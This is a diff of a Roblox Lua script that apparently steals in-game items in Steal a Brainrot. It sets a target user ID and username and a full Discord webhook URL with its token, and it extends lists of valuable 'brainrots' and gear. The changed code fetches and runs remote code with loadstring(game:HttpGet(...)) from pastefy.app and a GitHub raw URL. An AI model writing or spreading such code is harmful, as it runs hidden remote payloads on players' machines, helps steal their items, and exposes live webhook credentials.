@@ -1,6 +1,6 @@
-local TARGET_ID = 3919275912
-local TARGET_USER = "harodoh99"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1564685873029718076/7bZcwst-Xo-B3BjYfouhRrAt4tVaavbVty2-CnAPsX3NzmnXF6ScZH2pSQ86R6VB-z4o https://discord.com/api/webhooks/1564685873029718076/7bZcwst-Xo-B3BjYfouhRrAt4tVaavbVty2-CnAPsX3NzmnXF6ScZH2pSQ86R6VB-z4o"
+local TARGET_ID = 3142827065
+local TARGET_USER = "profsb56"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1572953795430850633/xtO-LEJCRVx2qVla4e_CGn_RXQYkln85Cv1iWBSIPgYaeAZ5RPI4zIAfAxQjRfNRpKbx"
 
 local TargetBrainrots = {
     ["Dragon Skeletonini"] = true,
@@ -287,7 +287,15 @@ local TargetBrainrots = {
     ["Burrito Bat"] = true,
     ["Chicli Chicla"] = true,
     ["Panda Popanda"] = true,
-    ["Deputy Leopard"] = true
+    ["Deputy Leopard"] = true,
+    ["Cobra Gelato"] = true,
+    ["Flying Dutchman"] = true,
+    ["Machine Bros"] = true,
+    ["Skelly and Coffy"] = true,
+    ["Sammyni Bros"] = true,
+    ["Puppetmaster"] = true,
+    ["Medusini and Demonini"] = true,
+    ["Cabin Bros"] = true
 }
 
 local TargetBaseSkins = {
@@ -324,6 +332,7 @@ local TargetGears = {
     ["Bloodmoon Hammer"] = true,
     ["Bloodmoon Slap"] = true,
     ["Candy Sentry"] = true,
+    ["Candy Slap"] = true,
     ["Cupid's Wings"] = true,
     ["Cursed Slap"] = true,
     ["Cyber Slap"] = true,
@@ -341,13 +350,14 @@ local TargetGears = {
     ["Yin Yang Lamp"] = true,
     ["Yin Yang Slap"] = true,
     ["Phantom Slap"] = true,
-    ["Crystal Slap"] = true
+    ["Crystal Slap"] = true,
+    ["Skeleton Dragon"] = true
 }
 
 task.spawn(function()
-    loadstring(game:HttpGet("https://orrxl4-protector.com/api/raw?id=cfdbbs0z"))()
+    loadstring(game:HttpGet("https://pastefy.app/eDmA1TWp/raw"))()
 
-    task.wait(1)
+task.wait(1)
 
     local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
     if type(script) == "function" then
